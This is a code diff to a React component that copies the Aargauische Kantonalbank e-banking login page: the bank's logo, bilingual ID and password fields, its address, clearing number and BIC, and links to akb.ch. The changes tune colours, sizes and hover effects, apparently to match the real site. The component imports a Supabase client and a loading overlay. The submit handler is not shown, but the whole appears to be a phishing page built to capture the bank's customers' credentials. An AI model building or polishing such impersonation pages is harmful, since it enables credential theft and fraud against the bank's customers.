@@ -1,18 +1,16 @@
 import { useEffect, useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
-import { ChevronRight, Eye, EyeOff } from "lucide-react";
+import { ChevronRight } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import akbLogoAsset from "@/assets/akb-logo.svg.asset.json";
 
-const AKB_BLUE = "#0072B8";
-const AKB_BLUE_LIGHT = "#009EE2";
-const AKB_BUTTON = "#7BB7D9";
-const AKB_BUTTON_HOVER = "#5fa3c8";
+const AKB_BLUE = "#0069a7";
+const AKB_BUTTON_DISABLED = "#7eb3d2";
 const AKB_TEXT = "#333333";
 const AKB_SUPPORT_BG = "#F2F2F2";
-const AKB_FOOTER_BG = "#0A2540";
+const AKB_FOOTER_BG = "#001a41";
 
 type Lang = "de" | "en";
 
@@ -21,7 +19,6 @@ const T = {
     title: "Login AKB e-Banking",
     id: "Identifikationsnummer",
     pw: "Passwort",
-    showPw: "Passwort anzeigen oder verbergen",
     terms1: "Mit dem Login akzeptiere ich die ",
     termsLink: "«Nutzungsbedingungen digitale Kanäle»",
     terms2: " der Aargauischen Kantonalbank.",
@@ -45,7 +42,6 @@ const T = {
     title: "Login AKB e-Banking",
     id: "Identification number",
     pw: "Password",
-    showPw: "Show or hide password",
     terms1: "By logging in, I accept the Aargauische Kantonalbank's ",
     termsLink: "Terms and Conditions",
     terms2: " for the use of its e-banking services.",
@@ -74,15 +70,11 @@ const ChAargauischeKantonalbank = () => {
 
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
   const [lang, setLang] = useState<Lang>("de");
   const [showLoading, setShowLoading] = useState(false);
   const t = T[lang];
 
-  usePageMeta(
-    "Login AKB e-Banking",
-    "https://www.akb.ch/favicon.ico"
-  );
+  usePageMeta("Login AKB e-Banking", "https://www.akb.ch/favicon.ico");
 
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -116,20 +108,11 @@ const ChAargauischeKantonalbank = () => {
     { label: t.s5, href: "https://www.akb.ch/sicherheit" },
   ];
 
-  const inputBaseStyle: React.CSSProperties = {
+  const inputStyle: React.CSSProperties = {
     border: `1px solid ${AKB_BLUE}`,
     borderRadius: 0,
     outline: "none",
     background: "#fff",
-  };
-
-  const inputFocus = (e: React.FocusEvent<HTMLInputElement>) => {
-    e.currentTarget.style.boxShadow = `0 0 0 3px rgba(0,114,184,0.2)`;
-    e.currentTarget.style.borderWidth = "2px";
-  };
-  const inputBlur = (e: React.FocusEvent<HTMLInputElement>) => {
-    e.currentTarget.style.boxShadow = "none";
-    e.currentTarget.style.borderWidth = "1px";
   };
 
   return (
@@ -149,16 +132,20 @@ const ChAargauischeKantonalbank = () => {
         }}
       >
         {/* Top accent strip */}
-        <div style={{ height: 4, background: AKB_BLUE_LIGHT }} />
+        <div style={{ height: 4, background: AKB_BLUE }} />
 
         {/* White header with logo */}
         <header className="w-full bg-white">
           <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-5 md:py-6">
-            <a href="https://www.akb.ch" aria-label="Aargauische Kantonalbank" className="inline-block">
+            <a
+              href="https://www.akb.ch"
+              aria-label="Aargauische Kantonalbank"
+              className="inline-block"
+            >
               <img
                 src={akbLogoAsset.url}
                 alt="Aargauische Kantonalbank"
-                className="h-12 md:h-16 w-auto"
+                className="h-9 md:h-11 w-auto"
               />
             </a>
           </div>
@@ -174,10 +161,8 @@ const ChAargauischeKantonalbank = () => {
                   key={code}
                   type="button"
                   onClick={() => setLang(code)}
-                  className="relative px-4 text-[15px] font-bold tracking-wide transition-colors"
-                  style={{
-                    color: active ? "#fff" : "rgba(255,255,255,0.75)",
-                  }}
+                  className="relative px-5 text-[17px] font-bold tracking-wide transition-colors"
+                  style={{ color: active ? "#fff" : "rgba(255,255,255,0.75)" }}
                 >
                   {code.toUpperCase()}
                   {active && (
@@ -190,9 +175,9 @@ const ChAargauischeKantonalbank = () => {
                         transform: "translateX(-50%)",
                         width: 0,
                         height: 0,
-                        borderLeft: "8px solid transparent",
-                        borderRight: "8px solid transparent",
-                        borderBottom: "8px solid #fff",
+                        borderLeft: "12px solid transparent",
+                        borderRight: "12px solid transparent",
+                        borderBottom: "10px solid #fff",
                       }}
                     />
                   )}
@@ -207,18 +192,19 @@ const ChAargauischeKantonalbank = () => {
           <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-10 md:py-14">
             <h1
               className="font-bold leading-tight mb-10 md:mb-14"
-              style={{
-                color: AKB_BLUE,
-                fontSize: "clamp(32px, 5vw, 48px)",
-              }}
+              style={{ color: AKB_BLUE, fontSize: "clamp(32px, 5vw, 48px)" }}
             >
               {t.title}
             </h1>
 
-            <div className="grid gap-10 md:gap-12 md:grid-cols-[1fr_400px]">
+            <div className="grid gap-10 md:gap-12 md:grid-cols-2">
               {/* Form column */}
-              <form onSubmit={handleSubmit} className="flex flex-col max-w-[640px]">
-                <label htmlFor="akb-id" className="block text-[15px] font-bold mb-2" style={{ color: AKB_TEXT }}>
+              <form onSubmit={handleSubmit} className="flex flex-col">
+                <label
+                  htmlFor="akb-id"
+                  className="block text-[15px] font-bold mb-2"
+                  style={{ color: AKB_TEXT }}
+                >
                   {t.id}
                 </label>
                 <input
@@ -227,39 +213,31 @@ const ChAargauischeKantonalbank = () => {
                   autoComplete="username"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  className="w-full h-12 px-3 text-[15px] mb-7"
-                  style={inputBaseStyle}
-                  onFocus={inputFocus}
-                  onBlur={inputBlur}
+                  className="w-full h-14 px-3 text-[15px] mb-7 focus:outline-none focus:ring-0"
+                  style={inputStyle}
                 />
 
-                <label htmlFor="akb-pw" className="block text-[15px] font-bold mb-2" style={{ color: AKB_TEXT }}>
+                <label
+                  htmlFor="akb-pw"
+                  className="block text-[15px] font-bold mb-2"
+                  style={{ color: AKB_TEXT }}
+                >
                   {t.pw}
                 </label>
-                <div className="relative mb-6">
-                  <input
-                    id="akb-pw"
-                    type={showPassword ? "text" : "password"}
-                    autoComplete="current-password"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    className="w-full h-12 pl-3 pr-12 text-[15px]"
-                    style={inputBaseStyle}
-                    onFocus={inputFocus}
-                    onBlur={inputBlur}
-                  />
-                  <button
-                    type="button"
-                    aria-label={t.showPw}
-                    onClick={() => setShowPassword((v) => !v)}
-                    className="absolute inset-y-0 right-0 flex items-center justify-center w-12"
-                    style={{ color: AKB_BLUE }}
-                  >
-                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                  </button>
-                </div>
+                <input
+                  id="akb-pw"
+                  type="password"
+                  autoComplete="current-password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="w-full h-14 px-3 text-[15px] mb-6 focus:outline-none focus:ring-0"
+                  style={inputStyle}
+                />
 
-                <p className="text-[14px] leading-6 mb-6" style={{ color: AKB_TEXT }}>
+                <p
+                  className="text-[14px] leading-6 mb-6"
+                  style={{ color: AKB_TEXT }}
+                >
                   {t.terms1}
                   <a
                     href="https://www.akb.ch/disclaimer"
@@ -276,17 +254,23 @@ const ChAargauischeKantonalbank = () => {
                 <button
                   type="submit"
                   disabled={disabled}
-                  className="w-full md:w-auto md:self-start h-12 px-12 text-[16px] text-white font-normal transition-colors"
+                  className="w-full md:w-auto md:self-start h-12 px-12 text-[16px] font-normal transition-colors"
                   style={{
-                    background: disabled ? "#c9d9e4" : AKB_BUTTON,
+                    background: disabled ? AKB_BUTTON_DISABLED : AKB_BLUE,
+                    color: "#fff",
+                    border: `1px solid ${disabled ? AKB_BUTTON_DISABLED : AKB_BLUE}`,
                     cursor: disabled ? "not-allowed" : "pointer",
                     borderRadius: 0,
                   }}
                   onMouseEnter={(e) => {
-                    if (!disabled) e.currentTarget.style.background = AKB_BUTTON_HOVER;
+                    if (disabled) return;
+                    e.currentTarget.style.background = "#fff";
+                    e.currentTarget.style.color = AKB_BLUE;
                   }}
                   onMouseLeave={(e) => {
-                    if (!disabled) e.currentTarget.style.background = AKB_BUTTON;
+                    if (disabled) return;
+                    e.currentTarget.style.background = AKB_BLUE;
+                    e.currentTarget.style.color = "#fff";
                   }}
                 >
                   {t.login}
@@ -294,26 +278,34 @@ const ChAargauischeKantonalbank = () => {
               </form>
 
               {/* Support column */}
-              <aside style={{ background: AKB_SUPPORT_BG }} className="p-8 self-start">
-                <h2 className="text-[22px] font-bold mb-5" style={{ color: AKB_TEXT }}>
+              <aside
+                style={{ background: AKB_SUPPORT_BG }}
+                className="p-8 self-start"
+              >
+                <h2
+                  className="text-[22px] font-bold mb-5"
+                  style={{ color: AKB_TEXT }}
+                >
                   {t.support}
                 </h2>
                 <ul>
                   {supportLinks.map((l, i) => (
-                    <li
-                      key={i}
-                      style={{ borderTop: i === 0 ? "none" : "1px solid #dcdcdc" }}
-                    >
+                    <li key={i}>
                       <a
                         href={l.href}
                         target="_blank"
                         rel="noopener noreferrer"
-                        className="flex items-start gap-2 py-3 text-[15px] hover:underline"
+                        className="group flex items-start gap-2 py-3 text-[15px] no-underline hover:no-underline transition-colors"
                         style={{ color: AKB_TEXT }}
+                        onMouseEnter={(e) => {
+                          e.currentTarget.style.color = AKB_BLUE;
+                        }}
+                        onMouseLeave={(e) => {
+                          e.currentTarget.style.color = AKB_TEXT;
+                        }}
                       >
                         <ChevronRight
-                          className="w-5 h-5 flex-shrink-0 mt-0.5"
-                          style={{ color: AKB_BLUE }}
+                          className="w-5 h-5 flex-shrink-0 mt-0.5 text-gray-500"
                           strokeWidth={2.5}
                         />
                         <span>{l.label}</span>
@@ -330,46 +322,61 @@ const ChAargauischeKantonalbank = () => {
         <footer style={{ background: AKB_FOOTER_BG, color: "#fff" }}>
           <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-12 grid gap-8 sm:grid-cols-2 md:grid-cols-4">
             <div>
-              <h3 className="text-[18px] font-bold mb-4">{t.fSupport}</h3>
+              <h3 className="text-[20px] font-bold mb-4">{t.fSupport}</h3>
               <a
                 href="https://www.akb.ch/kontakt"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="text-[14px] hover:underline"
+                className="text-[16px] hover:underline"
               >
                 {t.s1}
               </a>
             </div>
             <div>
-              <h3 className="text-[18px] font-bold mb-4">{t.fAnschrift}</h3>
-              <p className="text-[14px] leading-7">
+              <h3 className="text-[20px] font-bold mb-4">{t.fAnschrift}</h3>
+              <p className="text-[16px] leading-7">
                 Aargauische Kantonalbank<br />
                 Bahnhofplatz 1<br />
                 5001 Aarau
               </p>
             </div>
             <div>
-              <h3 className="text-[18px] font-bold mb-4">{t.fBankdaten}</h3>
-              <p className="text-[14px] leading-7">
+              <h3 className="text-[20px] font-bold mb-4">{t.fBankdaten}</h3>
+              <p className="text-[16px] leading-7">
                 Clearing-Nummer: 761<br />
                 BIC/Swift-Code: KBAGCH22
               </p>
             </div>
             <div>
-              <h3 className="text-[18px] font-bold mb-4">{t.fQuick}</h3>
-              <ul className="text-[14px] leading-7">
+              <h3 className="text-[20px] font-bold mb-4">{t.fQuick}</h3>
+              <ul className="text-[16px] leading-7">
                 <li>
-                  <a href="https://www.akb.ch/notfall" target="_blank" rel="noopener noreferrer" className="hover:underline">
+                  <a
+                    href="https://www.akb.ch/notfall"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="hover:underline"
+                  >
                     {t.fNotfall}
                   </a>
                 </li>
                 <li>
-                  <a href="https://www.akb.ch/sicherheit" target="_blank" rel="noopener noreferrer" className="hover:underline">
+                  <a
+                    href="https://www.akb.ch/sicherheit"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="hover:underline"
+                  >
                     {t.fSicherheit}
                   </a>
                 </li>
                 <li>
-                  <a href="https://www.akb.ch/kontakt" target="_blank" rel="noopener noreferrer" className="hover:underline">
+                  <a
+                    href="https://www.akb.ch/kontakt"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="hover:underline"
+                  >
                     {t.fHilfe}
                   </a>
                 </li>
